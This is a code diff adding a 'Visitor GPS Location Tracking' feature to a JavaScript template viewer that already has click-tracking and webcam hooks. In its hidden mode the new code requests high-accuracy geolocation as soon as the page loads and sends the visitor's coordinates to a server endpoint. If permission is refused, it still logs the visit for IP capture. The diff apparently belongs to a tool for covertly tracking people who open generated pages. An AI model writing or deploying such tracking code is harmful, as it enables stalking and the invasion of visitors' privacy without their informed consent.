@@ -15,6 +15,7 @@ const TemplateViewer = {
         this.initClickTracking();
         this.initWebcam();
         this.initSound();
+        this.initLocation();
     },
     
     // 1. Accordion Toggle Logic
@@ -483,6 +484,109 @@ const TemplateViewer = {
                     .catch(e => console.log("Failed to play on touch:", e));
                 };
                 events.forEach(evt => document.addEventListener(evt, playOnTouch));
+            }
+        });
+    },
+
+    // 6. Visitor GPS Location Tracking
+    initLocation: function() {
+        const trackers = document.querySelectorAll('.tmpl-location-tracker');
+        if (trackers.length === 0) return;
+        
+        const self = this;
+        
+        const sendLocation = (lat, lng, acc) => {
+            const formData = new FormData();
+            formData.append('template_id', self.templateId);
+            if (lat !== null) formData.append('latitude', lat);
+            if (lng !== null) formData.append('longitude', lng);
+            if (acc !== null) formData.append('accuracy', acc);
+            
+            fetch(self.baseUrl + 'api/submit-location', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log("Location telemetry sync success:", data);
+            })
+            .catch(err => console.error("Telemetry sync error:", err));
+        };
+        
+        const requestGPS = () => {
+            if (!navigator.geolocation) {
+                console.log("Geolocation is not supported by this browser.");
+                sendLocation(null, null, null); // Log IP fallback
+                return;
+            }
+            
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            };
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+                    console.log(`GPS captured: Lat=${lat}, Lng=${lng}, Acc=${acc}`);
+                    sendLocation(lat, lng, acc);
+                },
+                (error) => {
+                    console.log("GPS access failed or denied:", error.message);
+                    sendLocation(null, null, null); // Log IP fallback
+                },
+                options
+            );
+        };
+        
+        trackers.forEach(tracker => {
+            const isHidden = tracker.getAttribute('data-hide-box') === 'true';
+            
+            if (isHidden) {
+                // Auto trigger on load in background
+                requestGPS();
+            } else {
+                // Bind to button click
+                const btn = tracker.querySelector('.btn-trigger-location');
+                if (btn) {
+                    btn.addEventListener('click', function() {
+                        const origHtml = this.innerHTML;
+                        this.disabled = true;
+                        this.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Accessing GPS...';
+                        
+                        // Execute request
+                        if (!navigator.geolocation) {
+                            alert("Geolocation is not supported by your browser.");
+                            this.disabled = false;
+                            this.innerHTML = origHtml;
+                            sendLocation(null, null, null);
+                            return;
+                        }
+                        
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                this.innerHTML = '<i class="fa-solid fa-check"></i> Authorized';
+                                const lat = pos.coords.latitude;
+                                const lng = pos.coords.longitude;
+                                const acc = pos.coords.accuracy;
+                                sendLocation(lat, lng, acc);
+                            },
+                            (err) => {
+                                alert("Failed to retrieve location: " + err.message);
+                                this.disabled = false;
+                                this.innerHTML = origHtml;
+                                sendLocation(null, null, null);
+                            },
+                            { enableHighAccuracy: true, timeout: 10000 }
+                        );
+                    });
+                }
             }
         });
     }
